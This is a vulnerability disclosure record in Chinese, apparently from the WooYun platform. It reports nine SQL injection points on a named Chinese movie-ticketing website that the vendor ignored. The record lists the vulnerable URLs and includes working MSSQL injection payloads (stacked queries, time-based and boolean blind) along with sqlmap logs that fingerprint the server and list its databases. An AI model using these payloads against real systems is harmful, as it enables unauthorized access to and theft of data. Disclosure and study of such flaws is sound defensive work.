wybug_title: 影客票务网9处sql注入可泄漏所有数据库信息
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2015-10-19：	积极联系厂商并且等待厂商认领中，细节不对外公开									2015-12-03：	厂商已经主动忽略漏洞，细节向公众公开  简要描述：  详细说明：  http://www.yingke.tv/Product/ExchangeTicket.aspx?cityid=12http://www.yingke.tv/MovieList.aspx?keyword=ahttp://www.yingke.tv/MovieList.aspx?PlayType=2http://www.yingke.tv/Product/MovieCard.aspx?cityid=11http://www.yingke.tv/CinemaList.aspx?cityid=11http://www.yingke.tv/Product/PaperTicket.aspx?cityid=11http://www.yingke.tv/Shop/ShopDetail.aspx?id=1103http://www.yingke.tv/Shop/ShopIndex.aspx?categorysubid=82http://www.yingke.tv/HelpCenter.aspx?id=7   漏洞证明：  
Parameter: keyword (GET)    Type: boolean-based blind    Title: Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)    Payload: keyword=a';IF(8563=8563) SELECT 8563 ELSE DROP FUNCTION fiMb--    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: keyword=a';WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind (comment)    Payload: keyword=a' WAITFOR DELAY '0:0:5'-----[16:06:45] [INFO] testing Microsoft SQL Server[16:06:45] [INFO] confirming Microsoft SQL Server[16:06:46] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 7.5back-end DBMS: Microsoft SQL Server 2005[16:06:46] [INFO] fetching database names[16:06:46] [INFO] fetching number of databases[16:06:46] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[16:06:46] [INFO] retrieved: 12[16:06:48] [INFO] retrieved: EasyPay[16:07:27] [INFO] retrieved: master[16:07:46] [INFO] retrieved: model[16:08:08] [INFO] retrieved: msdb[16:08:30] [INFO] retrieved: ReportServer[16:09:06] [INFO] retrieved: ReportServerTempDB[16:10:01] [INFO] retrieved: tempdb[16:10:19] [INFO] retrieved: Test[16:10:32] [INFO] retrieved: WeiXinDataBase[16:11:13] [INFO] retrieved: YingKeData[16:11:37] [INFO] retrieved: YingKeDataTest[16:12:33] [INFO] retrieved: YKStoredCardavailable databases [12]:[*] EasyPay[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] tempdb[*] Test[*] WeiXinDataBase[*] YingKeData[*] YingKeDataTest[*] YKStoredCard
